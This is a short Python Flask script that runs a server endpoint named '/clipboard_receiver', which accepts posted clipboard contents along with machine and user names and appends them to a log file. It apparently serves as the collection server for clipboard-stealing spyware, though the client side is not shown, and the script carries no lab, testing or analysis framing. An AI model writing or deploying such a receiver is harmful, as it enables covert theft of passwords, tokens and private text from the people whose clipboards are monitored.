from flask import Flask, request

app = Flask(__name__)

@app.route('/clipboard_receiver', methods=['POST'])
def receive_clipboard():
    clipboard_data = request.form.get('clipboard_data')
    machine_name = request.form.get('machine_name')
    user_name = request.form.get('user_name')

    with open('clipboard_logs.txt', 'a') as f:
        f.write(f"[{machine_name}] [{user_name}] Clipboard: {clipboard_data}\n")

    return "Data received", 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
